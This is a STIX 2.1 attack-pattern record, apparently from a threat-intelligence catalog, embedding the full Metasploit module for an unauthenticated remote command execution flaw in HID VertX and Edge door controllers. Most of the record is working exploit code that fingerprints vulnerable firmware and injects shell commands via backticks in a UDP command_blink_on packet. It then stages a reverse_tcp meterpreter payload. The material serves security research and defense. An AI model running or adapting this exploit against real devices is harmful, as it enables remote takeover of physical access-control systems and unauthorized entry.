{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b3f6d1f3-9cf0-4759-acda-6be70e3b7479",
    "created": "2024-08-14T16:57:39.299537Z",
    "modified": "2024-08-14T16:57:39.299541Z",
    "name": "HID discoveryd command_blink_on Unauthenticated RCE",
    "description": " This module exploits an unauthenticated remote command execution vulnerability in the discoveryd service exposed by HID VertX and Edge door controllers.  This module was tested successfully on a HID Edge model EH400 with firmware version 2.3.1.603 (Build 04/23/2012). ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/misc/hid_discoveryd_command_blink_on_unauth_rce.rb",
            "external_id": "hid_discoveryd_command_blink_on_unauth_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.trendmicro.com/let-get-door-remote-root-vulnerability-hid-door-controllers/"
        },
        {
            "source_name": "reference",
            "url": "http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html"
        },
        {
            "source_name": "reference",
            "url": "https://exfil.co/2016/05/09/exploring-the-hid-eh400/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/lixmk/Concierge"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/coldfusion39/VertXploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Udp\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'HID discoveryd command_blink_on Unauthenticated RCE',\n      'Description' => %q{\n        This module exploits an unauthenticated remote command execution\n        vulnerability in the discoveryd service exposed by HID VertX and Edge\n        door controllers.\n\n        This module was tested successfully on a HID Edge model EH400\n        with firmware version 2.3.1.603 (Build 04/23/2012).\n      },\n      'Author'      =>\n        [\n          'Ricky \"HeadlessZeke\" Lawshae', # Discovery\n          'coldfusion39', # VertXploit\n          'bcoles' # Metasploit\n        ],\n      'License'     => MSF_LICENSE,\n      'Platform'    => 'linux',\n      'Arch'        => ARCH_ARMLE,\n      'Privileged'  => true,\n      'References'  =>\n        [\n          ['ZDI', '16-223'],\n          ['URL', 'https://blog.trendmicro.com/let-get-door-remote-root-vulnerability-hid-door-controllers/'],\n          ['URL', 'http://nosedookie.blogspot.com/2011/07/identifying-and-querying-hid-vertx.html'],\n          ['URL', 'https://exfil.co/2016/05/09/exploring-the-hid-eh400/'],\n          ['URL', 'https://github.com/lixmk/Concierge'],\n          ['URL', 'https://github.com/coldfusion39/VertXploit']\n        ],\n      'DisclosureDate'  => '2016-03-28',\n      'DefaultOptions'  =>\n        {\n          'WfsDelay'          => 30,\n          'PAYLOAD'           => 'linux/armle/meterpreter/reverse_tcp',\n          'CMDSTAGER::FLAVOR' => 'echo'\n        },\n      'Targets'         => [['Automatic', {}]],\n      'CmdStagerFlavor' => 'echo', # wget is available, however the wget command is too long\n      'DefaultTarget'   => 0))\n    register_options [ Opt::RPORT(4070) ]\n  end\n\n  def check\n    connect_udp\n    udp_sock.put 'discover;013;'\n    res = udp_sock.get(5)\n    disconnect_udp\n\n    if res.to_s.eql? ''\n      vprint_error 'Connection failed'\n      return CheckCode::Unknown\n    end\n\n    hid_res = parse_discovered_response res\n    if hid_res[:mac].eql? ''\n      vprint_error 'Malformed response'\n      return CheckCode::Safe\n    end\n\n    @mac = hid_res[:mac]\n\n    vprint_good \"#{rhost}:#{rport} - HID discoveryd service detected\"\n    vprint_line hid_res.to_s\n    report_service(\n      host: rhost,\n      mac: hid_res[:mac],\n      port: rport,\n      proto: 'udp',\n      name: 'hid-discoveryd',\n      info: hid_res\n    )\n\n    if hid_res[:version].to_s.eql? ''\n      vprint_error \"#{rhost}:#{rport} - Could not determine device version\"\n      return CheckCode::Detected\n    end\n\n    # Vulnerable version mappings from VertXploit\n    vuln = false\n    version = Rex::Version.new(hid_res[:version].to_s)\n    case hid_res[:model]\n    when 'E400'     # EDGEPlus\n      vuln = true if version <= Rex::Version.new('3.5.1.1483')\n    when 'EH400'    # EDGE EVO\n      vuln = true if version <= Rex::Version.new('3.5.1.1483')\n    when 'EHS400'   # EDGE EVO Solo\n      vuln = true if version <= Rex::Version.new('3.5.1.1483')\n    when 'ES400'    # EDGEPlus Solo\n      vuln = true if version <= Rex::Version.new('3.5.1.1483')\n    when 'V2-V1000' # VertX EVO\n      vuln = true if version <= Rex::Version.new('3.5.1.1483')\n    when 'V2-V2000' # VertX EVO\n      vuln = true if version <= Rex::Version.new('3.5.1.1483')\n    when 'V1000'    # VertX Legacy\n      vuln = true if version <= Rex::Version.new('2.2.7.568')\n    when 'V2000'    # VertX Legacy\n      vuln = true if version <= Rex::Version.new('2.2.7.568')\n    else\n      vprint_error \"#{rhost}:#{rport} - Device model was not recognized\"\n      return CheckCode::Detected\n    end\n\n    vuln ? CheckCode::Appears : CheckCode::Safe\n  end\n\n  def send_command(cmd)\n    connect_udp\n\n    # double escaping for echo -ne stager\n    encoded_cmd = cmd.gsub(\"\\\\\", \"\\\\\\\\\\\\\")\n\n    # packet length (max 44)\n    len = '044'\n\n    # <num> of times to blink LED, if the device has a LED; else\n    # <num> second to beep (very loudly) if the device does not have a LED\n    num = -1 # no beep/blink ;)\n\n    # construct packet\n    req = ''\n    req << 'command_blink_on;'\n    req << \"#{len};\"\n    req << \"#{@mac};\"\n    req << \"#{num}`#{encoded_cmd}`;\"\n\n    # send packet\n    udp_sock.put req\n    res = udp_sock.get(5)\n    disconnect_udp\n\n    unless res.to_s.start_with? 'ack;'\n      fail_with Failure::UnexpectedReply, 'Malformed response'\n    end\n  end\n\n  def execute_command(cmd, opts)\n    # the protocol uses ';' as a separator,\n    # so we issue each system command separately.\n    # we're using the echo command stager which hex encodes the payload,\n    # so there's no risk of replacing any ';' characters in the payload data.\n    cmd.split(';').each do |c|\n      send_command c\n    end\n  end\n\n  def exploit\n    print_status \"#{rhost}:#{rport} - Connecting to target\"\n\n    check_code = check\n    unless check_code == CheckCode::Appears || check_code == CheckCode::Detected\n      fail_with Failure::Unknown, \"#{rhost}:#{rport} - Target is not vulnerable\"\n    end\n\n    # linemax is closer to 40,\n    # however we need to account for additinal double escaping\n    execute_cmdstager linemax: 30, :temp => '/tmp'\n  end\n\n  def parse_discovered_response(res)\n    info = {}\n\n    return unless res.start_with? 'discovered'\n\n    hid_res = res.split(';')\n    return unless hid_res.size == 9\n    return unless hid_res[0] == 'discovered'\n    return unless hid_res[1].to_i == res.length\n\n    {\n      :mac          => hid_res[2],\n      :name         => hid_res[3],\n      :ip           => hid_res[4],\n      # ?           => hid_res[5], # '1'\n      :model        => hid_res[6],\n      :version      => hid_res[7],\n      :version_date => hid_res[8]\n    }\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-28",
    "x_mitre_platforms": [
        "linux'"
    ]
}